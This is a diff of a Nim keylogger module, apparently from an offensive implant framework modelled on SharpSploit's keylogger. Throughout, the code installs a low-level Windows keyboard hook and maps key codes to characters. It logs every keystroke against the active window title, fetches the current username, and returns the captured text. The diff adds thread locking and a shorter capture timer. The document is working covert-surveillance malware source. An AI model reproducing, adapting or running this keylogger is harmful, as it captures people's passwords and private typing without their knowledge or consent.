@@ -6,14 +6,18 @@
         - https://github.com/cobbr/SharpSploit/blob/2fdfc2eec891717884484bb7dde15f8a12113ad3/SharpSploit/Enumeration/Keylogger.cs
 ]#
 
-# https://github.com/rbmz/stopwatch
 include "system/timers"
 import asyncdispatch
 import winim/lean
 import tables
 import strformat
 import strutils
+import locks
+import os
+import sharedtables
+from ../utils/job import tLock
 
+# Stop watch code from here: https://github.com/rbmz/stopwatch
 type clock* = object
   clockStart*: int64
   clockStop*: int64
@@ -310,9 +314,17 @@ const
         Keys.OemOpenBrackets: "",
     }.toTable()
 
-var 
- windowsToKey = initTable[string, string]()
- c: clock
+
+var
+  #workerThread: Thread[void]
+  #tLock: Lock
+  # chan: Channel[string]
+  c: clock
+
+var windowsToKey: Table[string, string]
+# var windowsToKey* {.threadvar.}: Table[string, string]
+#var windowsToKey* {.threadvar.}: SharedTable[string, string]
+# var collkeyspressed {.threadvar.}: seq[string] 
 
 proc GetActiveWindowTitle(): LPWSTR = 
     var capacity: int32 = 256
@@ -322,13 +334,14 @@ proc GetActiveWindowTitle(): LPWSTR =
     GetWindowText(wHandle, builder, capacity)
     return builder
 
-proc HookCallback(nCode: int32, wParam: WPARAM, lParam: LPARAM): LRESULT {.stdcall.} =    
+proc HookCallback(nCode: int32, wParam: WPARAM, lParam: LPARAM): LRESULT {.gcsafe, stdcall.} =    
     if nCode >= 0 and wParam == WM_KEYDOWN:
         var keypressed: string
         var kbdstruct: PKBDLLHOOKSTRUCT = cast[ptr KBDLLHOOKSTRUCT](lparam)
         var currentActiveWindow = GetActiveWindowTitle()
         var shifted: bool = (GetKeyState(160) < 0) or (GetKeyState(161) < 0)
         var keycode: Keys = cast[Keys](kbdstruct.vkCode)
+
         if shifted and (keycode in KeyDictShift):
             keypressed = KeyDictShift.getOrDefault(keycode)
         elif keycode in KeyDict:
@@ -339,63 +352,76 @@ proc HookCallback(nCode: int32, wParam: WPARAM, lParam: LPARAM): LRESULT {.stdca
                 keypressed = $toLowerAscii(chr(ord(keycode)))
             else:
                 keypressed = $toUpperAscii(chr(ord(keycode)))
+        acquire(tLock)
+        #collkeyspressed.add(fmt"{currentActiveWindow} {keypressed}")
         if windowsToKey.hasKeyOrPut($currentActiveWindow, keypressed):
-           windowsToKey[$currentActiveWindow] = windowsToKey[$currentActiveWindow] & keypressed
-            
+            windowsToKey[$currentActiveWindow] = windowsToKey[$currentActiveWindow] & keypressed
         echo fmt"[*] Key: {keypressed} [Window: '{currentActiveWindow}']"
+        release(tLock)
     c.stop()
     echo "c.nanoseconds: ", c.nanoseconds()
-    if c.nanoseconds() > 300000000: 
-        echo "sending post quit message"
+    if c.nanoseconds() > 100000000: 
+        echo "sending post quit message sending to channel"
+        echo "Sending this to channel: ", $windowsToKey
+        # chan.send($windowsToKey)
         # 18 = 0x0012
         PostQuitMessage(18)
         return 0
     else: 
         return CallNextHookEx(0, nCode, wParam, lParam)
+    # return CallNextHookEx(0, nCode, wParam, lParam)
 
-# Helper proc to obtain current user
+
 proc getUser*(): Future[string] {.async.} = 
     var buffer: array[MAX_USERNAME_LENGTH, WCHAR]
     var size = uint32(len(buffer))
     discard GetUserNameW(addr(buffer[0]), cast[LPDWORD](addr(size)))
     result = $buffer
-
-proc execute*(): Future[Table[string, string]] {.async.} =
-    when defined(windows):
-        c.start()
-        echo "Attempting to set hook"
-        var hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) HookCallback, 0,  0)
-        if bool(hook):
-            try:
-                echo "[*] Hook successful"
-                PostMessage(0, 0, 0, 0)
-                var msg: MSG
-                while GetMessage(msg.addr, 0, 0, 0):
-                    # echo "inside while loop, mainTuple: ", $mySeq
-                    # it's been  30 seconds break
-                    # if c.nanoseconds() > 300000000:
-                        #echo "Been 30 seconds"
-                        #discard
-                        #UnhookWindowsHookEx(hook)
-                        #break
-                    discard
-            finally:
-                UnhookWindowsHookEx(hook)
-        result = windowsToKey
-
-
-
-#proc main() {.async.} =
     
-    # echo $buffer
-    #var myTable = initTable[string, string]()
-    # var mySeq: seq[string]
-    # var mainTuple = (counter: 0, chrToWindow: myTable)
-    # echo "Calling execute"
-    # var mySeq = await execute()
-    # echo "inside main after execute has been called: ", $mySeq
+proc execute*(): Table[string, string] {.gcsafe} = 
+    c.start()
+    echo "Timer has been started"
+    var hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) HookCallback, 0,  0)
+    if bool(hook):
+        try:
+            echo "[*] Hook successful"
+            PostMessage(0, 0, 0, 0)
+            var msg: MSG
+            while GetMessage(msg.addr, 0, 0, 0):
+                # acquire(tLock)
+                # echo "inside while loop, mainTuple: ", $collkeyspressed
+                # release(tLock)
+                discard
+        finally:
+            UnhookWindowsHookEx(hook)
+    echo "Inside keylog execute returning result!"
+    result = windowsToKey
+
+
+#proc main(): Future[void] {.async.} =
+    # var myTable = initTable[string, string]()
+   # var myTable: seq[string]
+   # var mainTuple = (counter: 0, chrToWindow: myTable)
+    #echo "mainTuple before spawning: ", $mainTuple
+    #chan.open()
+    #initLock(tLock)
+    #createThread(workerThread, execute)
+    # while readLine(stdin) != "STOP":
+    #while readLine(stdin) != "STOP":
+        # echo "Trying to receive data"
+    #    let tried = chan.tryRecv()
+     #   if tried.dataAvailable:
+     #       echo tried.msg # "Another message"
+     #       break
+    #for i in 0..high(thr):
+       # echo "Creating thread: ", i
+    #   createThread(thr[i], execute)
+    #workerThread.joinThread()
+    # joinThreads(thr)
+   # deinitLock(tLock)
     # var x: Flowvar[bool] = spawn execute(mainTuple)
     # echo "x: ", $(^x)
+   # echo "Hello"
+    #chan.close()
 
-
-#waitFor main()
+# waitFor main()
